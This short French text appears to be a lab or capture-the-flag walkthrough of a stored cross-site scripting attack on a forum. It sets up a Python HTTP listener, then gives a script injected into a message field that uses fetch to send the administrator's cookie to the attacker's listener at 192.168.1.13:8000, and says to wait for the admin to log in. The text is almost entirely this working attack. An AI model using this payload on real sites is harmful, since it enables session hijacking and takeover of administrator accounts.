
On met un serveur HTTP listener :
```bash
python3 -m http.server 8000
```

On injecte un script dans la balise message du forum pour récupérer le cookie de l'admin.
```html
<script>fetch('http://192.168.1.13:8000?cookie='+document.cookie)</script>
```

Ensuite, il suffit d'attendre que l'admin se connecte et on récupère son cookie.
